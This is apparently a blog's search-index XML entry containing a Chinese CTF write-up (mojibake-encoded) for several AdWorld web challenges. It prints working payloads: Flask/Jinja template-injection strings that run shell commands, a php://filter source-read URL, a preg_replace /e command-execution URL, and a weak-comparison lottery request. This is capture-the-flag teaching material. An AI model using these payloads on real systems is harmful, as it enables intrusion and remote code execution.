<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•ŒWebé«˜æ‰‹è¿›é˜¶åŒº(äºŒ)</title>
    <link href="/2022/06/15/AdWorld-2/"/>
    <url>/2022/06/15/AdWorld-2/</url>
    
    <content type="html"><![CDATA[<h1 id="upload1"><a class="markdownIt-Anchor" href="#upload1"></a> upload1</h1><p>æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡è¯•è¯•çœ‹ï¼Œæ–‡ä»¶åå¯ä»¥å›æ˜¾ï¼Œåˆ©ç”¨æ—¶é—´æˆ³è¿›è¡Œéšæœºå‘½å</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085014026.png" alt="" /></p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸Šé©¬äº†ï¼Œè¯•è¯•phpä¸€å¥è¯æœ¨é©¬ï¼Œæœ‰å‰ç«¯çš„é™åˆ¶</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085136843.png" alt="" /></p><p>æ”¹ä¸ªåç¼€ç»§ç»­ä¸Šä¼ ï¼Œè¢«wafæ£€æµ‹åˆ°äº†</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085422720.png" alt="" /></p><p>æ–‡ä»¶åå†æ”¹å›æ¥ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯wafå¯¹bodyè¿›è¡Œè¿‡æ»¤ï¼Œçœ‹æ¥æ˜¯åç¼€phpè¢«è¿‡æ»¤æ‰äº†ï¼Œä¸å¯¹bodyè¿›è¡Œæ£€æŸ¥</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611085840865.png" alt="" /></p><p>ä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œçªç„¶åˆä¸Šä¼ æˆåŠŸäº†ï¼Œè«åå…¶å¦™ï¼Œéš¾é“æ¢ä¸ªç½‘ç»œèƒ½ç¦æ‰wafï¼Ÿåæ¥çœ‹åˆ«äººçš„wpï¼Œå±…ç„¶æ²¡æœ‰é‡åˆ°wafï¼<strong>çœ‹æ¥è¿™ä¸ªç—…æ¯’æ£€æµ‹æ˜¯æˆ‘è‡ªå·±æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œå¤ªtmå‘äº†</strong>ï¼Œæˆ‘è¿˜åœ¨æ‰¾å„ç§åç«¯ç»•è¿‡å§¿åŠ¿ğŸ˜…</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611091338595.png" alt="" /></p><p>æ€»ç»“æ¥è®²å°±æ˜¯å‰ç«¯ç™½åå•è¿‡æ»¤è€Œå·²ï¼Œæ²¡æœ‰åç«¯é™åˆ¶ï¼Œé‚£ä¸éšä¾¿ç»•è¿‡</p><hr /><h1 id="web_python_template_injection"><a class="markdownIt-Anchor" href="#web_python_template_injection"></a> Web_python_template_injection</h1><p>çœ‹é¢˜ç›®æ˜¯pythonçš„æ¨¡æ¿æ³¨å…¥ï¼Œç”¨wappalyzeråˆ†æä¸€ä¸‹ï¼Œpython2.7 + flask 0.15</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611091944894.png" alt="" /></p><p>äº†è§£äº†è§£æ¨¡æ¿æ³¨å…¥ç›¸å…³çŸ¥è¯†ï¼Œhackbarè‡ªå¸¦å„ä¸ªæœåŠ¡å™¨ç‰ˆæœ¬çš„æ¨¡æ¿æ³¨å…¥, payloadä¸º</p><p><code>http://111.200.241.244:59314/&#123;&#123;g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()&#125;&#125;</code></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611093627244.png" alt="" /></p><p>çœ‹åˆ°fl4gï¼Œcatå¾—flag <code>ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125;</code></p><hr /><h1 id="easytornado"><a class="markdownIt-Anchor" href="#easytornado"></a> easytornado</h1><p>Tornado æ¡†æ¶ï¼Œçœ‹çœ‹flag.txté‡Œé¢æœ‰å•¥ï¼Œå®ƒè¯´åœ¨/fllllllllllllagé‡Œé¢</p><p>æ ¹æ®urlæ˜¯é€šè¿‡fileé¡µé¢ä¼ é€’filenameå˜é‡è¿›è¡Œæ–‡ä»¶æŸ¥çœ‹ï¼Œåé¢è¿˜è·Ÿä¸€ä¸ªhashå€¼</p><p><code>111.200.241.244:58328/file?filename=/flag.txt&amp;filehash=fe0c9ba81112b2249b3f3b448b3b19e6</code></p><p>hashå€¼çš„è®¡ç®—æ–¹æ³•åœ¨hints.phpé‡Œé¢</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611094503799.png" alt="" /></p><p>ç”±äºmd5ä¸å¯é€†ï¼Œå…³é”®æ˜¯æ‰¾åˆ°cookie_secretï¼Œç½‘ä¸Šæ‰¾æ‰¾tornadoæ¡†æ¶çš„cookie_secretç›¸å…³çŸ¥è¯†</p><blockquote><p>å®˜æ–¹æ–‡æ¡£å…³äºå®‰å…¨cookieä»‹ç» <a href="https://tornado-zh.readthedocs.io/zh/latest/guide/security.html#cookies-secure-cookies">è®¤è¯å’Œå®‰å…¨ â€” Tornado 4.3 æ–‡æ¡£ (tornado-zh.readthedocs.io)</a></p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611101509107.png" alt="" /></p><p>ç®€è€Œè¨€ä¹‹ï¼Œ<code>cookie_secret</code>ä¿è¯å®Œæ•´æ€§ä½†ä¸ä¿è¯æœºå¯†æ€§ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç”¨å…¶ä»–æ–¹å¼æ³„éœ²<code>cookie_secret</code></p><p>çœ‹çœ‹ç¬¬äºŒä¸ªé¡µé¢renderå‡½æ•°æœ‰ä»€ä¹ˆä½œç”¨ï¼Œrenderæ„ä¸ºæ¸²æŸ“ï¼›<code>self.render(&quot;entry.html&quot;, entry=entry)</code> è¡¨ç¤ºç”¨entry.htmlè¿™ä¸ªæ¨¡æ¿ï¼Œç”¨å³è¾¹entryæ¥å®ä¾‹åŒ–è¯¥æ¨¡æ¿ä¸­çš„entryå‚æ•°ï¼Œä»è€Œæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚</p><p>åœ¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™å‡ºç°ä»¥ä¸‹é¡µé¢ï¼Œå‡ºé”™é¡µé¢ï¼Œé€šè¿‡msgå˜é‡è¿›è¡Œæ¸²æŸ“ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611102046955.png" alt="" /></p><p>å°è¯•äº†ä¸€ä¸‹æœåŠ¡å™¨ç›´æ¥ç»™æˆ‘è·ªäº†ï¼Œ<s>è°ƒçš®</s></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611105234034.png" alt="" /></p><p>æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ï¼Œ<code>cookie_secret</code> åœ¨Applicationå¯¹è±¡settingsçš„å±æ€§ä¸­ ï¼Œèµ‹å€¼handler.settings</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611111821319.png" alt="" /></p><p><code>cookie_secret</code>å€¼ä¸º<code>93ee0919-c1d4-4e69-8f85-f23a4cc728c8</code>å‰©ä¸‹çš„å°±æ˜¯è®¡ç®—/fllllllllllllagçš„hashè¿›è¡Œæ‹¼æ¥</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220611112400102.png" alt="" /></p><p>æœ¬é¢˜å°±æ˜¯äº†è§£tornadoæ¡†æ¶çš„cookie_secret å’Œtemplate renderçš„åˆ©ç”¨</p><hr /><h1 id="shrine"><a class="markdownIt-Anchor" href="#shrine"></a> shrine</h1><p>æºç å®¡è®¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__) <br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>) <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read() <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>): <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>): <br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>] <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s <br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>è¿™é¢˜çœ‹äº†åŠå¤©ï¼Œæœ‰å‡ ä¸ªæ¯”è¾ƒç–‘æƒ‘çš„ç‚¹</p><p>é€šè¿‡è·å–FLAGç¯å¢ƒå˜é‡å­˜æ”¾å†app.config.é‡Œ</p><p>ä½†ç¬¬äºŒä¸ªè·¯ç”±æˆ‘çœ‹ä¸æ‡‚shrineçš„å‚æ•°æ€ä¹ˆç»™çš„ï¼Œæ²¡æœ‰ç½‘ç»œè¯·æ±‚è·å–ï¼Œä¹Ÿæ²¡æœ‰ä»è·¯ç”±é‡Œé¢è·å–ï¼Œæˆ‘åœ¨æœ¬åœ°ç¯å¢ƒæµ‹è¯•äº†ä¸‹ä¼šæŠ¥é”™</p><p>ä»è·¯ç”±è·å–çš„è¯æ˜¯ä¸‹é¢è¿™ä¸ªæ ¼å¼<code>@app.route('/shrine/&lt;shrine&gt;')</code></p><blockquote><p>é€šè¿‡æŠŠ URL çš„ä¸€éƒ¨åˆ†æ ‡è®°ä¸º <code>&lt;variable_name&gt;</code> å°±å¯ä»¥åœ¨ URL ä¸­æ·»åŠ å˜é‡ã€‚æ ‡è®°çš„ éƒ¨åˆ†ä¼šä½œä¸ºå…³é”®å­—å‚æ•°ä¼ é€’ç»™å‡½æ•°ã€‚é€šè¿‡ä½¿ç”¨ <code>&lt;converter:variable_name&gt;</code> ï¼Œå¯ä»¥ é€‰æ‹©æ€§çš„åŠ ä¸Šä¸€ä¸ªè½¬æ¢å™¨ï¼Œä¸ºå˜é‡æŒ‡å®šè§„åˆ™ã€‚</p></blockquote><p>æ²¡åŠæ³•å’¯ï¼Œåªèƒ½çœ‹wpğŸ˜­ï¼Œè¯´æ˜¯æ¨¡æ¿æ³¨å…¥(<s>æ€ä¹ˆä¸ªæ¨¡æ¿æ³¨å…¥æ³•ï¼Œè‡ªå·±çš„ç¯å¢ƒå¤ç°ä¸äº†</s>)ï¼Œåœ¨é¶æœºä¸Šè¯•ä¸‹</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220613202134087.png" alt="" /></p><p>é»‘åå•ä¼šæŠŠconfigå’Œselfè®¾ä¸ºNoneï¼Œè€Œæˆ‘ä»¬æ­£è¦è·å–app.config</p><p>è·å–flaskçš„å…¨å±€é…ç½®é€”å¾„æˆ‘ä¹Ÿä¸å¤ªæ‡‚ï¼Œç›´æ¥ç²˜è´´ä¸‹æ¥ï¼Œæ”¶é›†ä¸‹æ¥æ–¹ä¾¿ä»¥åä½¿ç”¨</p><p><code>current_app</code>ä¸ºå…¨å±€ä»£ç†å˜é‡</p><p>payloadä¸º<code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></p><hr /><h1 id="ics-05"><a class="markdownIt-Anchor" href="#ics-05"></a> ics-05</h1><blockquote><p>tips: å…¶ä»–ç ´åè€…ä¼šåˆ©ç”¨å·¥æ§äº‘ç®¡ç†ç³»ç»Ÿè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒçš„åé—¨å…¥ä¾µç³»ç»Ÿ</p></blockquote><p>è®¿é—®è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒå•¥ä¹Ÿæ²¡æœ‰ï¼Œçœ‹çœ‹ç½‘ç»œè¯·æ±‚å‘ç°å¥‡æ€ªçš„ä¸œè¥¿<code>http://111.200.241.244:52497/somrthing.json?page=1&amp;limit=10</code></p><p>è¿™ä¸ªçŠ¶æ€ç ä¸º404ï¼Œå°è¯•å¯¹pageçš„å€¼è¿›è¡Œçˆ†ç ´ï¼Œä½†æ²¡ä»€ä¹ˆåµç”¨</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220614211204850.png" alt="" /></p><p>å‘ç°<code>http://111.200.241.244:51326/index.php?page=1</code> æœ‰å›æ˜¾ï¼Œè¯•äº†è¯•sqlmapï¼Œä¹Ÿæ²¡ä»€ä¹ˆç”¨</p><p>çœ‹wpå‘ç°ä½¿ç”¨ä¼ªåè®®ï¼Œä½†è¿™ä¸ªä¸æ˜¯åœ¨æ–‡ä»¶åŒ…å«é‡Œé¢ç”¨çš„å—ï¼Ÿ<s>æ€ä¹ˆå‘ç°çš„</s> çœ‹æ¥è¿˜æ˜¯å¯¹è¿™ç§urlå½¢å¼ä¸æ•æ„Ÿï¼Œè¯»å–æºç </p><p><code>http://111.200.241.244:51326/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;input&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;ta:text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&#x27;text&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Ok&#x27;</span>);<br>    &#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-keyword">die</span>();<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°ç¡®å®æ˜¯æ–‡ä»¶åŒ…å«ï¼Œä¸è¿‡å°†inputï¼Œtextç­‰è¿‡æ»¤æ‰äº†ï¼Œé˜²æ­¢æˆ‘ä»¬ç›´æ¥RCEæ‹¿flag</p><p><strong><code>pre_replace</code></strong> å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ã€‚</p><blockquote><p>/e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç ï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚</p></blockquote><p>æ–¹æ³•æ˜ç¡®äº†ï¼Œæ„é€ xffï¼Œè¿›å…¥å‡½æ•°å†…éƒ¨æ‰§è¡Œpreg_replaceå®ç°RCE, payloadå¦‚ä¸‹</p><p><code>http://111.200.241.244:51326/index.php?pat=/bluearc/e&amp;rep=system('find -name *flag*')&amp;sub=bluearc</code></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615093333178.png" alt="" /></p><blockquote><p>find  -name * <em>flag</em> * è¯¥å‘½ä»¤å¯ä»¥æœ‰æ•ˆæ‰¾åˆ°ä»¥å½“å‰ç›®å½•ç¯å¢ƒä¸‹çš„æ‰€æœ‰flag</p><p>ä¹Ÿå¯ä»¥ fine / -name * <em>flag</em> *</p></blockquote><p><code>http://111.200.241.244:51326/index.php?pat=/bluearc/e&amp;rep=system('./s3chahahaDir/flag/flag.php')&amp;sub=bluearc</code></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615093806567.png" alt="" /></p><p><em><strong>æ€»ç»“ä¸€ä¸‹</strong></em></p><ul><li><p>è¦å¯¹<code>?page=</code> æˆ–è€…<code>?file=</code> å¸¦å›æ˜¾çš„æ•æ„Ÿä¸€ç‚¹ï¼Œæœ‰å¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«ï¼Œç„¶åé€šè¿‡ä¼ªåè®®è·å–æºç </p></li><li><p>**<code>pre_replace</code>**çš„/eæ¼æ´ï¼Œå¯¼è‡´RCE</p></li></ul><hr /><h1 id="lottery"><a class="markdownIt-Anchor" href="#lottery"></a> lottery</h1><p>æ³¨å†Œè´¦å·ä¹°å½©ç¥¨ï¼Œåˆå§‹$20ï¼Œæ¶ˆè€—$2ä¹°ä¸€å¼ </p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615100711367.png" alt="image-20220615100711367" /></p><p>ç”¨burpæŠ“åŒ…çœ‹äº†çœ‹ï¼Œéƒ½æ˜¯é€šè¿‡api.phpçš„æ¥å£å®Œæˆæ“ä½œï¼Œæ²¡æœ‰å¯åˆ©ç”¨çš„ç‚¹ï¼Œç»™äº†ä¸€ä¸‹æç¤ºï¼Œä½†æŠ“åŒ…çœ‹æ²¡æœ‰æŠ˜æ‰£çš„åœ°æ–¹</p><blockquote><p>Notice: You are offered a huge discount!</p></blockquote><p>å¿…é¡»å¾—çœ‹æºç ï¼Œæ‰«äº†ä¸‹ç›®å½•å‘ç°æœ‰gitï¼Œè§£é¢˜ç‚¹ä¸º<strong>gitæºç æ³„éœ²</strong>ï¼Œä¸Šgit_extractè„šæœ¬(åæ¥å‘ç°é¢˜ç›®ç»™äº†æºç )</p><p>å®¡è®¡äº†ä¸€ä¸‹æºç ï¼Œmoneyçš„å€¼ä¿å­˜åœ¨**<code>$_SESSION</code>**ä¼šè¯ä¸­ï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™èµ‹å€¼ä¸º20</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615112602398.png" alt="" /></p><p><strong><code>$_SESSION</code></strong> å¯¹ç”¨æˆ·ä¸å¯æ§ï¼Œ</p><h3 id="sessionçš„å·¥ä½œåŸç†"><a class="markdownIt-Anchor" href="#sessionçš„å·¥ä½œåŸç†"></a> sessionçš„å·¥ä½œåŸç†</h3><blockquote><p>PHP session å˜é‡ç”¨äºå­˜å‚¨å…³äºç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„ä¿¡æ¯ï¼Œæˆ–è€…æ›´æ”¹ç”¨æˆ·ä¼šè¯ï¼ˆsessionï¼‰çš„è®¾ç½®ã€‚Session å˜é‡å­˜å‚¨å•ä¸€ç”¨æˆ·çš„ä¿¡æ¯</p></blockquote><ul><li>å­˜å‚¨: å¯é€šè¿‡phpinfoæŸ¥çœ‹session.save_pathçš„å€¼ï¼Œå³å­˜å‚¨ä½ç½®ã€‚</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sess_PHPSESSID<br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sessions/sess_PHPSESSID<br><span class="hljs-regexp">/xxx/</span>tmp/sess_PHPSESSID<br><span class="hljs-regexp">/xxxx/</span>tmp<span class="hljs-regexp">/sessions/</span>sess_PHPSESSID<br></code></pre></td></tr></table></figure><ul><li>å‘½å: sessionæ–‡ä»¶åæ ¼å¼ä¸º<code>sess_[phpsessid]</code>ã€‚è€Œphpsessidæ¥æºäºå®¢æˆ·ç«¯å­˜å‚¨çš„cookieå­—æ®µã€‚æœåŠ¡å™¨ä¼šé€šè¿‡ä¸åŒçš„session IDä½¿ç”¨ä¸åŒçš„æ–‡ä»¶</li></ul><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615144306598.png" alt="" /></p><p>å³åœ¨session.save_pathä¸­è¯¥æ–‡ä»¶åä¸º<code>sess_e59f658b4866e547c1118b4a3f48a3c1</code></p><ul><li>å†…å®¹: é»˜è®¤ç”¨session.serialize_handlerçš„é…ç½®ï¼Œå¯¹**<code>$_SESSION</code>**å˜é‡è¿›è¡Œåºåˆ—åŒ–åè¿›è¡Œå­˜å‚¨</li></ul><p>æœ¬é¢˜æ²¡æœ‰ç”¨åˆ°sessionçš„ç›¸å…³åˆ©ç”¨ï¼Œä¸€èˆ¬æ˜¯ç»“åˆ<strong>æ–‡ä»¶åŒ…å«</strong></p><p>å†æ¬¡è¿›è¡Œæºç å®¡è®¡ï¼Œæœ‰ä»¥ä¸‹æ€è·¯</p><ul><li>ä¿®æ”¹è‡ªå·±çš„money</li><li>é™ä½flagçš„ä»·æ ¼</li><li>ç»•è¿‡ä¸­å¥–åˆ¤æ–­æœºåˆ¶</li></ul><p>ç¬¬ä¸‰ä¸ªå…·æœ‰å¯è¡Œæ€§ï¼Œæ¯”è¾ƒæ•°å­—çš„æ—¶å€™æ˜¯ç”¨å¼±ç±»å‹æ¯”è¾ƒ</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615145548623.png" alt="" /></p><p><strong>æ•°å­—æ¯”è¾ƒå¯ç”¨trueç»•è¿‡</strong>ï¼Œæ„é€ å¦‚ä¸‹payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>111.200.241.244:65291<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>69<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36 Edg/102.0.1245.41<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://111.200.241.244:65291<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://111.200.241.244:65291/buy.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=033ccd6090ed9e7b2533a4803695805f<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;buy&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;numbers&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span> <span class="hljs-punctuation">,</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">true</span> <span class="hljs-punctuation">,</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220615151152237.png" alt="" /></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•ŒWebé«˜æ‰‹è¿›é˜¶åŒº(ä¸€)</title>
    <link href="/2022/06/10/AdWorld-1/"/>
    <url>/2022/06/10/AdWorld-1/</url>
    
